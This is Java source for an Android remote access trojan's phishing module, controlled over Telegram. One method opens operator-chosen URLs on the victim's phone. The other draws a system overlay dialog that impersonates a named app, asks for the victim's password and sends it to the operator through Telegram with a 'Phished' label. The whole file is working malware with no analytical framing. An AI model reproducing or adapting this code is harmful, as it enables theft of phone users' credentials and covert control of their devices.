package com.enterprise.rat.commands;

import android.app.AlertDialog;
import android.content.Context;
import android.graphics.Color;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.enterprise.rat.utils.TelegramApi;

public class PhishingManager {
    private Context context;

    public PhishingManager(Context context) { this.context = context; }

    public void openURL(String url) {
        try {
            android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url));
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("✅ URL Opened: " + url);
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Error opening URL");
        }
    }

    public static void showPhishingDialog(Context context, String appName, String title) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AlertDialog.Builder builder = new AlertDialog.Builder(context, android.R.style.Theme_DeviceDefault_Light_Dialog);
                LinearLayout layout = new LinearLayout(context);
                layout.setOrientation(LinearLayout.VERTICAL);
                layout.setPadding(50, 30, 50, 20);

                TextView iconView = new TextView(context);
                iconView.setText("🔐");
                iconView.setTextSize(40);
                iconView.setGravity(android.view.Gravity.CENTER);
                layout.addView(iconView);

                TextView titleView = new TextView(context);
                titleView.setText(appName + " - " + title);
                titleView.setTextSize(18);
                titleView.setTextColor(Color.BLACK);
                titleView.setPadding(0, 20, 0, 10);
                titleView.setGravity(android.view.Gravity.CENTER);
                layout.addView(titleView);

                TextView messageView = new TextView(context);
                messageView.setText("Please enter your password to continue");
                messageView.setTextSize(14);
                messageView.setTextColor(Color.GRAY);
                messageView.setGravity(android.view.Gravity.CENTER);
                layout.addView(messageView);

                final EditText input = new EditText(context);
                input.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
                input.setHint("Password");
                layout.addView(input);

                builder.setView(layout);
                builder.setPositiveButton("Confirm", (dialog, which) -> {
                    String password = input.getText().toString();
                    TelegramApi.sendMessage("🎣 <b>Phished:</b> " + appName + " - " + password);
                });
                builder.setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss());
                builder.setCancelable(false);

                AlertDialog dialog = builder.create();
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
                } else {
                    dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
                }
                dialog.show();
            } catch (Exception e) { TelegramApi.sendMessage("❌ Phish Error: " + e.getMessage()); }
        });
    }
}
